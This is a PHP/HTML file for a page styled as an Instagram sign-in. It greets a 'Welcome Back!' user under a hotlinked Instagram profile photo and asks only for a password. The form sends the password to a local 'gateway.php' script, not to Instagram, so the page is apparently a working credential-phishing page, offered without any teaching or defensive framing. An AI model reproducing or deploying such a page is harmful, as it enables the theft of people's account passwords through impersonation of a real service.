<?php
//    echo "Hello World";

?>

<html>
    <body>
        <head>
            <link href="signin.css" rel="stylesheet">
            <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
            <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.11.0/umd/popper.min.js" integrity="sha384-b/U6ypiBEHpOf/4+1nzFpr53nxSS+GLCkfwBdFNTxtclqqenISfwAzpKaMNFNmj4" crossorigin="anonymous"></script>
            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
            <link rel="stylesheet" href="css/font-awesome.min.css">
        </head>

        <title>Stratz - Make a new friends!</title>
        
    <div class="container">
      
      <form class="form-signin" method="POST" action="gateway.php">
        <img src="https://scontent-frt3-1.cdninstagram.com/t51.2885-19/11243837_1583569618565054_1527734176_a.jpg" class="rounded mx-auto d-block">
        <center><h5>Welcome Back!</h5><i>@Username</i></center>
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" id="pass" name="pass" class="form-control" placeholder="Password" required>

        <button class="btn btn-medium btn-primary btn-block" type="submit"><span class="fa fa-instagram" aria-hidden="true"></span> Sign in with Instagram</button>
      </form>

    </div> <!-- /container -->
    </body>
</html>